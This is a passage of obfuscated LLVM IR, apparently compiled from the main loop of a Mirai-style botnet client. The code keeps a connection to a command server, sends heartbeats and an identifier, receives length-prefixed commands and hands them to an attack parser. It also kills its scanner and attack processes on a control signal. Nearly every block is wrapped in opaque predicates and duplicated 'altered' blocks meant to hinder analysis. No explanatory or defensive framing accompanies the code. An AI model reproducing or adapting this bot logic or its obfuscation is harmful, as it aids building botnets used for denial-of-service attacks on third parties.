  %293 = load i32, i32* @y
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br i1 %291, label %300, label %302

; <label>:300:                                    ; preds = %originalBBpart249
  %301 = load i32, i32* @fd_ctrl, align 4
  store i32 %301, i32* %13, align 4
  br label %320

; <label>:302:                                    ; preds = %originalBBpart249
  %303 = load i32, i32* @x
  %304 = load i32, i32* @y
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %302
  %311 = load i32, i32* @fd_serv, align 4
  store i32 %311, i32* %13, align 4
  %312 = load i32, i32* @x
  %313 = load i32, i32* @y
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %320

; <label>:320:                                    ; preds = %originalBBpart253, %300
  %321 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %321, align 8
  %322 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 10, i64* %322, align 8
  %323 = load i32, i32* %13, align 4
  %324 = add nsw i32 %323, 1
  %325 = call i32 @select(i32 %324, %struct.__sigset_t* %10, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %325, i32* %14, align 4
  %326 = load i32, i32* %14, align 4
  %327 = icmp eq i32 %326, -1
  br i1 %327, label %328, label %329

; <label>:328:                                    ; preds = %320
  br label %134

; <label>:329:                                    ; preds = %320
  %330 = load i32, i32* %14, align 4
  %331 = icmp eq i32 %330, 0
  br i1 %331, label %332, label %358

; <label>:332:                                    ; preds = %329
  store i16 0, i16* %19, align 2
  %333 = load i32, i32* %8, align 4
  %334 = add nsw i32 %333, 1
  store i32 %334, i32* %8, align 4
  %335 = srem i32 %333, 6
  %336 = icmp eq i32 %335, 0
  br i1 %336, label %337, label %357

; <label>:337:                                    ; preds = %332
  %338 = load i32, i32* @x
  %339 = load i32, i32* @y
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %337
  %346 = load i32, i32* @fd_serv, align 4
  %347 = bitcast i16* %19 to i8*
  %348 = call i64 @send(i32 %346, i8* %347, i64 2, i32 16384)
  %349 = load i32, i32* @x
  %350 = load i32, i32* @y
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %357

; <label>:357:                                    ; preds = %originalBBpart257, %332
  br label %358

; <label>:358:                                    ; preds = %357, %329
  br label %359

; <label>:359:                                    ; preds = %358
  %360 = load i32, i32* @fd_ctrl, align 4
  %361 = icmp ne i32 %360, -1
  br i1 %361, label %362, label %387

; <label>:362:                                    ; preds = %359
  %363 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %364 = load i32, i32* @fd_ctrl, align 4
  %365 = sdiv i32 %364, 64
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds [16 x i64], [16 x i64]* %363, i64 0, i64 %366
  %368 = load i64, i64* %367, align 8
  %369 = load i32, i32* @fd_ctrl, align 4
  %370 = srem i32 %369, 64
  %371 = zext i32 %370 to i64
  %372 = shl i64 1, %371
  %373 = and i64 %368, %372
  %374 = icmp ne i64 %373, 0
  br i1 %374, label %375, label %387

; <label>:375:                                    ; preds = %362
  store i32 16, i32* %21, align 4
  %376 = load i32, i32* @fd_ctrl, align 4
  %377 = bitcast %union.__SOCKADDR_ARG* %22 to %struct.sockaddr**
  %378 = bitcast %struct.sockaddr_in* %20 to %struct.sockaddr*
  store %struct.sockaddr* %378, %struct.sockaddr** %377, align 8
  %379 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %22, i32 0, i32 0
  %380 = load %struct.sockaddr*, %struct.sockaddr** %379, align 8
  %381 = call i32 @accept(i32 %376, %struct.sockaddr* %380, i32* %21)
  call void @scanner_kill()
  %382 = load i32, i32* @maintain_thread, align 4
  %383 = call i32 @kill(i32 %382, i32 9) #7
  call void @attack_kill_all()
  %384 = load i32, i32* %7, align 4
  %385 = mul nsw i32 %384, -1
  %386 = call i32 @kill(i32 %385, i32 9) #7
  call void @exit(i32 0) #8
  unreachable

; <label>:387:                                    ; preds = %362, %359
  %388 = load i32, i32* @x
  %389 = load i32, i32* @y
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %387
  %396 = load i8, i8* @pending_connection, align 1
  %397 = icmp ne i8 %396, 0
  %398 = load i32, i32* @x
  %399 = load i32, i32* @y
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %397, label %406, label %486

; <label>:406:                                    ; preds = %originalBBpart261
  store i8 0, i8* @pending_connection, align 1
  %407 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %408 = load i32, i32* @fd_serv, align 4
  %409 = sdiv i32 %408, 64
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds [16 x i64], [16 x i64]* %407, i64 0, i64 %410
  %412 = load i64, i64* %411, align 8
  %413 = load i32, i32* @fd_serv, align 4
  %414 = srem i32 %413, 64
  %415 = zext i32 %414 to i64
  %416 = shl i64 1, %415
  %417 = and i64 %412, %416
  %418 = icmp ne i64 %417, 0
  br i1 %418, label %420, label %419

; <label>:419:                                    ; preds = %406
  call void @teardown_connection()
  br label %485

; <label>:420:                                    ; preds = %406
  store i32 0, i32* %23, align 4
  store i32 4, i32* %24, align 4
  %421 = load i32, i32* @fd_serv, align 4
  %422 = bitcast i32* %23 to i8*
  %423 = call i32 @getsockopt(i32 %421, i32 1, i32 4, i8* %422, i32* %24) #7
  %424 = load i32, i32* %23, align 4
  %425 = icmp ne i32 %424, 0
  br i1 %425, label %426, label %433

; <label>:426:                                    ; preds = %420
  %427 = load i32, i32* @fd_serv, align 4
  %428 = call i32 @close(i32 %427)
  store i32 -1, i32* @fd_serv, align 4
  %429 = call i32 @rand_next()
  %430 = urem i32 %429, 10
  %431 = add i32 %430, 1
  %432 = call i32 @sleep(i32 %431)
  br label %468

; <label>:433:                                    ; preds = %420
  %434 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %435 = call i32 @util_strlen(i8* %434)
  %436 = trunc i32 %435 to i8
  store i8 %436, i8* %25, align 1
  %437 = call i32 @util_local_addr()
  store i32 %437, i32* @LOCAL_ADDR, align 4
  %438 = load i32, i32* @fd_serv, align 4
  %439 = call i64 @send(i32 %438, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i32 0, i32 0), i64 4, i32 16384)
  %440 = load i32, i32* @fd_serv, align 4
  %441 = call i64 @send(i32 %440, i8* %25, i64 1, i32 16384)
  %442 = load i8, i8* %25, align 1
  %443 = zext i8 %442 to i32
  %444 = icmp sgt i32 %443, 0
  br i1 %444, label %445, label %451

; <label>:445:                                    ; preds = %433
  %446 = load i32, i32* @fd_serv, align 4
  %447 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %448 = load i8, i8* %25, align 1
  %449 = zext i8 %448 to i64
  %450 = call i64 @send(i32 %446, i8* %447, i64 %449, i32 16384)
  br label %451

; <label>:451:                                    ; preds = %445, %433
  %452 = load i32, i32* @x
  %453 = load i32, i32* @y
  %454 = sub i32 %452, 1
  %455 = mul i32 %452, %454
  %456 = urem i32 %455, 2
  %457 = icmp eq i32 %456, 0
  %458 = icmp slt i32 %453, 10
  %459 = or i1 %457, %458
  br i1 %459, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %451
  %460 = load i32, i32* @x
  %461 = load i32, i32* @y
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %468

; <label>:468:                                    ; preds = %originalBBpart265, %426
  %469 = load i32, i32* @x
  %470 = load i32, i32* @y
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %468
  %477 = load i32, i32* @x
  %478 = load i32, i32* @y
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %485

; <label>:485:                                    ; preds = %originalBBpart269, %419
  br label %755

; <label>:486:                                    ; preds = %originalBBpart261
  %487 = load i32, i32* @fd_serv, align 4
  %488 = icmp ne i32 %487, -1
  br i1 %488, label %489, label %754

; <label>:489:                                    ; preds = %486
  %490 = load i32, i32* @x
  %491 = load i32, i32* @y
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %489
  %498 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %499 = load i32, i32* @fd_serv, align 4
  %500 = sdiv i32 %499, 64
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds [16 x i64], [16 x i64]* %498, i64 0, i64 %501
  %503 = load i64, i64* %502, align 8
  %504 = load i32, i32* @fd_serv, align 4
  %505 = srem i32 %504, 64
  %506 = zext i32 %505 to i64
  %507 = shl i64 1, %506
  %508 = and i64 %503, %507
  %509 = icmp ne i64 %508, 0
  %510 = load i32, i32* @x
  %511 = load i32, i32* @y
  %512 = sub i32 %510, 1
  %513 = mul i32 %510, %512
  %514 = urem i32 %513, 2
  %515 = icmp eq i32 %514, 0
  %516 = icmp slt i32 %511, 10
  %517 = or i1 %515, %516
  br i1 %517, label %originalBBpart282, label %originalBB71alteredBB

originalBBpart282:                                ; preds = %originalBB71
  br i1 %509, label %518, label %754

; <label>:518:                                    ; preds = %originalBBpart282
  %519 = call i32* @__errno_location() #9
  store i32 0, i32* %519, align 4
  %520 = load i32, i32* @fd_serv, align 4
  %521 = bitcast i16* %27 to i8*
  %522 = call i64 @recv(i32 %520, i8* %521, i64 2, i32 16386)
  %523 = trunc i64 %522 to i32
  store i32 %523, i32* %26, align 4
  %524 = load i32, i32* %26, align 4
  %525 = icmp eq i32 %524, -1
  br i1 %525, label %526, label %589

; <label>:526:                                    ; preds = %518
  %527 = load i32, i32* @x
  %528 = load i32, i32* @y
  %529 = sub i32 %527, 1
  %530 = mul i32 %527, %529
  %531 = urem i32 %530, 2
  %532 = icmp eq i32 %531, 0
  %533 = icmp slt i32 %528, 10
  %534 = or i1 %532, %533
  br i1 %534, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %526
  %535 = call i32* @__errno_location() #9
  %536 = load i32, i32* %535, align 4
  %537 = icmp eq i32 %536, 11
  %538 = load i32, i32* @x
  %539 = load i32, i32* @y
  %540 = sub i32 %538, 1
  %541 = mul i32 %538, %540
  %542 = urem i32 %541, 2
  %543 = icmp eq i32 %542, 0
  %544 = icmp slt i32 %539, 10
  %545 = or i1 %543, %544
  br i1 %545, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br i1 %537, label %554, label %546

; <label>:546:                                    ; preds = %originalBBpart286
  %547 = call i32* @__errno_location() #9
  %548 = load i32, i32* %547, align 4
  %549 = icmp eq i32 %548, 11
  br i1 %549, label %554, label %550

; <label>:550:                                    ; preds = %546
  %551 = call i32* @__errno_location() #9
  %552 = load i32, i32* %551, align 4
  %553 = icmp eq i32 %552, 4
  br i1 %553, label %554, label %571

; <label>:554:                                    ; preds = %550, %546, %originalBBpart286
  %555 = load i32, i32* @x
  %556 = load i32, i32* @y
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %554
  %563 = load i32, i32* @x
  %564 = load i32, i32* @y
  %565 = sub i32 %563, 1
  %566 = mul i32 %563, %565
  %567 = urem i32 %566, 2
  %568 = icmp eq i32 %567, 0
  %569 = icmp slt i32 %564, 10
  %570 = or i1 %568, %569
  br i1 %570, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br label %134

; <label>:571:                                    ; preds = %550
  store i32 0, i32* %26, align 4
  br label %572

; <label>:572:                                    ; preds = %571
  %573 = load i32, i32* @x
  %574 = load i32, i32* @y
  %575 = sub i32 %573, 1
  %576 = mul i32 %573, %575
  %577 = urem i32 %576, 2
  %578 = icmp eq i32 %577, 0
  %579 = icmp slt i32 %574, 10
  %580 = or i1 %578, %579
  br i1 %580, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %572
  %581 = load i32, i32* @x
  %582 = load i32, i32* @y
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br label %589

; <label>:589:                                    ; preds = %originalBBpart294, %518
  %590 = load i32, i32* %26, align 4
  %591 = icmp eq i32 %590, 0
  br i1 %591, label %592, label %593

; <label>:592:                                    ; preds = %589
  call void @teardown_connection()
  br label %134

; <label>:593:                                    ; preds = %589
  %594 = load i16, i16* %27, align 2
  %595 = zext i16 %594 to i32
  %596 = icmp eq i32 %595, 0
  br i1 %596, label %597, label %601

; <label>:597:                                    ; preds = %593
  %598 = load i32, i32* @fd_serv, align 4
  %599 = bitcast i16* %27 to i8*
  %600 = call i64 @recv(i32 %598, i8* %599, i64 2, i32 16384)
  br label %134

; <label>:601:                                    ; preds = %593
  %602 = load i16, i16* %27, align 2
  %603 = call zeroext i16 @ntohs(i16 zeroext %602) #9
  store i16 %603, i16* %27, align 2
  %604 = load i16, i16* %27, align 2
  %605 = zext i16 %604 to i64
  %606 = icmp ugt i64 %605, 1024
  br i1 %606, label %607, label %610

; <label>:607:                                    ; preds = %601
  %608 = load i32, i32* @fd_serv, align 4
  %609 = call i32 @close(i32 %608)
  store i32 -1, i32* @fd_serv, align 4
  br label %610

; <label>:610:                                    ; preds = %607, %601
  %611 = call i32* @__errno_location() #9
  store i32 0, i32* %611, align 4
  %612 = load i32, i32* @fd_serv, align 4
  %613 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %614 = load i16, i16* %27, align 2
  %615 = zext i16 %614 to i64
  %616 = call i64 @recv(i32 %612, i8* %613, i64 %615, i32 16386)
  %617 = trunc i64 %616 to i32
  store i32 %617, i32* %26, align 4
  %618 = load i32, i32* %26, align 4
  %619 = icmp eq i32 %618, -1
  br i1 %619, label %620, label %699

; <label>:620:                                    ; preds = %610
  %621 = load i32, i32* @x
  %622 = load i32, i32* @y
  %623 = sub i32 %621, 1
  %624 = mul i32 %621, %623
  %625 = urem i32 %624, 2
  %626 = icmp eq i32 %625, 0
  %627 = icmp slt i32 %622, 10
  %628 = or i1 %626, %627
  br i1 %628, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %620
  %629 = call i32* @__errno_location() #9
  %630 = load i32, i32* %629, align 4
  %631 = icmp eq i32 %630, 11
  %632 = load i32, i32* @x
  %633 = load i32, i32* @y
  %634 = sub i32 %632, 1
  %635 = mul i32 %632, %634
  %636 = urem i32 %635, 2
  %637 = icmp eq i32 %636, 0
  %638 = icmp slt i32 %633, 10
  %639 = or i1 %637, %638
  br i1 %639, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br i1 %631, label %664, label %640

; <label>:640:                                    ; preds = %originalBBpart298
  %641 = call i32* @__errno_location() #9
  %642 = load i32, i32* %641, align 4
  %643 = icmp eq i32 %642, 11
  br i1 %643, label %664, label %644

; <label>:644:                                    ; preds = %640
  %645 = load i32, i32* @x
  %646 = load i32, i32* @y
  %647 = sub i32 %645, 1
  %648 = mul i32 %645, %647
  %649 = urem i32 %648, 2
  %650 = icmp eq i32 %649, 0
  %651 = icmp slt i32 %646, 10
  %652 = or i1 %650, %651
  br i1 %652, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %644
  %653 = call i32* @__errno_location() #9
  %654 = load i32, i32* %653, align 4
  %655 = icmp eq i32 %654, 4
  %656 = load i32, i32* @x
  %657 = load i32, i32* @y
  %658 = sub i32 %656, 1
  %659 = mul i32 %656, %658
  %660 = urem i32 %659, 2
  %661 = icmp eq i32 %660, 0
  %662 = icmp slt i32 %657, 10
  %663 = or i1 %661, %662
  br i1 %663, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br i1 %655, label %664, label %681

; <label>:664:                                    ; preds = %originalBBpart2102, %640, %originalBBpart298
  %665 = load i32, i32* @x
  %666 = load i32, i32* @y
  %667 = sub i32 %665, 1
  %668 = mul i32 %665, %667
  %669 = urem i32 %668, 2
  %670 = icmp eq i32 %669, 0
  %671 = icmp slt i32 %666, 10
  %672 = or i1 %670, %671
  br i1 %672, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %664
  %673 = load i32, i32* @x
  %674 = load i32, i32* @y
  %675 = sub i32 %673, 1
  %676 = mul i32 %673, %675
  %677 = urem i32 %676, 2
  %678 = icmp eq i32 %677, 0
  %679 = icmp slt i32 %674, 10
  %680 = or i1 %678, %679
  br i1 %680, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br label %134

; <label>:681:                                    ; preds = %originalBBpart2102
  %682 = load i32, i32* @x
  %683 = load i32, i32* @y
  %684 = sub i32 %682, 1
  %685 = mul i32 %682, %684
  %686 = urem i32 %685, 2
  %687 = icmp eq i32 %686, 0
  %688 = icmp slt i32 %683, 10
  %689 = or i1 %687, %688
  br i1 %689, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %681
  store i32 0, i32* %26, align 4
  %690 = load i32, i32* @x
  %691 = load i32, i32* @y
  %692 = sub i32 %690, 1
  %693 = mul i32 %690, %692
  %694 = urem i32 %693, 2
  %695 = icmp eq i32 %694, 0
  %696 = icmp slt i32 %691, 10
  %697 = or i1 %695, %696
  br i1 %697, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br label %698

; <label>:698:                                    ; preds = %originalBBpart2110
  br label %699

; <label>:699:                                    ; preds = %698, %610
  %700 = load i32, i32* %26, align 4
  %701 = icmp eq i32 %700, 0
  br i1 %701, label %702, label %719

; <label>:702:                                    ; preds = %699
  %703 = load i32, i32* @x
  %704 = load i32, i32* @y
  %705 = sub i32 %703, 1
  %706 = mul i32 %703, %705
  %707 = urem i32 %706, 2
  %708 = icmp eq i32 %707, 0
  %709 = icmp slt i32 %704, 10
  %710 = or i1 %708, %709
  br i1 %710, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %702
  call void @teardown_connection()
  %711 = load i32, i32* @x
  %712 = load i32, i32* @y
  %713 = sub i32 %711, 1
  %714 = mul i32 %711, %713
  %715 = urem i32 %714, 2
  %716 = icmp eq i32 %715, 0
  %717 = icmp slt i32 %712, 10
  %718 = or i1 %716, %717
  br i1 %718, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br label %134

; <label>:719:                                    ; preds = %699
  %720 = load i32, i32* @fd_serv, align 4
  %721 = bitcast i16* %27 to i8*
  %722 = call i64 @recv(i32 %720, i8* %721, i64 2, i32 16384)
  %723 = load i16, i16* %27, align 2
  %724 = call zeroext i16 @ntohs(i16 zeroext %723) #9
  store i16 %724, i16* %27, align 2
  %725 = load i32, i32* @fd_serv, align 4
  %726 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %727 = load i16, i16* %27, align 2
  %728 = zext i16 %727 to i64
  %729 = call i64 @recv(i32 %725, i8* %726, i64 %728, i32 16384)
  %730 = load i16, i16* %27, align 2
  %731 = zext i16 %730 to i32
  %732 = icmp sgt i32 %731, 0
  br i1 %732, label %733, label %753

; <label>:733:                                    ; preds = %719
  %734 = load i32, i32* @x
  %735 = load i32, i32* @y
  %736 = sub i32 %734, 1
  %737 = mul i32 %734, %736
  %738 = urem i32 %737, 2
  %739 = icmp eq i32 %738, 0
  %740 = icmp slt i32 %735, 10
  %741 = or i1 %739, %740
  br i1 %741, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %733
  %742 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %743 = load i16, i16* %27, align 2
  %744 = zext i16 %743 to i32
  call void @attack_parse(i8* %742, i32 %744)
  %745 = load i32, i32* @x
  %746 = load i32, i32* @y
  %747 = sub i32 %745, 1
  %748 = mul i32 %745, %747
  %749 = urem i32 %748, 2
  %750 = icmp eq i32 %749, 0
  %751 = icmp slt i32 %746, 10
  %752 = or i1 %750, %751
  br i1 %752, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br label %753

; <label>:753:                                    ; preds = %originalBBpart2118, %719
  br label %754

; <label>:754:                                    ; preds = %753, %originalBBpart282, %486
  br label %755

; <label>:755:                                    ; preds = %754, %485
  br label %134
                                                  ; No predecessors!
  %757 = load i32, i32* %3, align 4
  ret i32 %757

originalBBalteredBB:                              ; preds = %originalBB, %42
  %758 = load i8**, i8*** %5, align 8
  %759 = getelementptr inbounds i8*, i8** %758, i64 1
  %760 = load i8*, i8** %759, align 8
  %761 = call i32 @util_strlen(i8* %760)
  %762 = icmp slt i32 %761, 32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %78
  %763 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %764 = call i32 @util_strcpy(i8* %763, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %107
  %765 = call i32 @fork() #7
  store i32 %765, i32* @pid2, align 4
  %766 = load i32, i32* @pid2, align 4
  %767 = icmp ne i32 %766, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %134
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %161
  %768 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %769 = getelementptr inbounds [16 x i64], [16 x i64]* %768, i64 0, i64 0
  %770 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %769) #7, !srcloc !2
  %771 = extractvalue { i64, i64* } %770, 0
  %772 = extractvalue { i64, i64* } %770, 1
  %773 = trunc i64 %771 to i32
  store i32 %773, i32* %17, align 4
  %774 = ptrtoint i64* %772 to i64
  %775 = trunc i64 %774 to i32
  store i32 %775, i32* %18, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %186
  %776 = load i32, i32* @fd_ctrl, align 4
  %777 = icmp ne i32 %776, -1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %205
  %778 = load i32, i32* @fd_ctrl, align 4
  %_ = sub i32 %778, 64
  %gen = mul i32 %_, 64
  %779 = srem i32 %778, 64
  %780 = zext i32 %779 to i64
  %_23 = shl i64 1, %780
  %_24 = sub i64 1, %780
  %gen25 = mul i64 %_24, %780
  %_26 = shl i64 1, %780
  %781 = shl i64 1, %780
  %782 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %783 = load i32, i32* @fd_ctrl, align 4
  %_27 = shl i32 %783, 64
  %_28 = shl i32 %783, 64
  %_29 = sub i32 0, %783
  %gen30 = add i32 %_29, 64
  %_31 = sub i32 %783, 64
  %gen32 = mul i32 %_31, 64
  %784 = sdiv i32 %783, 64
  %785 = sext i32 %784 to i64
  %786 = getelementptr inbounds [16 x i64], [16 x i64]* %782, i64 0, i64 %785
  %787 = load i64, i64* %786, align 8
  %_33 = sub i64 0, %787
  %gen34 = add i64 %_33, %781
  %_35 = sub i64 %787, %781
  %gen36 = mul i64 %_35, %781
  %_37 = sub i64 %787, %781
  %gen38 = mul i64 %_37, %781
  %_39 = shl i64 %787, %781
  %788 = or i64 %787, %781
  store i64 %788, i64* %786, align 8
  br label %originalBB22

originalBB43alteredBB:                            ; preds = %originalBB43, %233
  %789 = load i32, i32* @fd_serv, align 4
  %790 = icmp eq i32 %789, -1
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %280
  %791 = load i32, i32* @fd_ctrl, align 4
  %792 = load i32, i32* @fd_serv, align 4
  %793 = icmp sgt i32 %791, %792
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %302
  %794 = load i32, i32* @fd_serv, align 4
  store i32 %794, i32* %13, align 4
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %337
  %795 = load i32, i32* @fd_serv, align 4
  %796 = bitcast i16* %19 to i8*
  %797 = call i64 @send(i32 %795, i8* %796, i64 2, i32 16384)
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %387
  %798 = load i8, i8* @pending_connection, align 1
  %799 = icmp ne i8 %798, 0
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %451
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %468
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %489
  %800 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %801 = load i32, i32* @fd_serv, align 4
  %802 = sdiv i32 %801, 64
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds [16 x i64], [16 x i64]* %800, i64 0, i64 %803
  %805 = load i64, i64* %804, align 8
  %806 = load i32, i32* @fd_serv, align 4
  %_72 = shl i32 %806, 64
  %_73 = shl i32 %806, 64
  %_74 = shl i32 %806, 64
  %_75 = sub i32 0, %806
  %gen76 = add i32 %_75, 64
  %807 = srem i32 %806, 64
  %808 = zext i32 %807 to i64
  %_77 = shl i64 1, %808
  %809 = shl i64 1, %808
  %_78 = shl i64 %805, %809
  %_79 = sub i64 %805, %809
  %gen80 = mul i64 %_79, %809
  %810 = and i64 %805, %809
  %811 = icmp ne i64 %810, 0
  br label %originalBB71

originalBB84alteredBB:                            ; preds = %originalBB84, %526
  %812 = call i32* @__errno_location() #9
  %813 = load i32, i32* %812, align 4
  %814 = icmp eq i32 %813, 11
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %554
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %572
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %620
  %815 = call i32* @__errno_location() #9
  %816 = load i32, i32* %815, align 4
  %817 = icmp eq i32 %816, 11
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %644
  %818 = call i32* @__errno_location() #9
  %819 = load i32, i32* %818, align 4
  %820 = icmp eq i32 %819, 4
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %664
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %681
  store i32 0, i32* %26, align 4
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %702
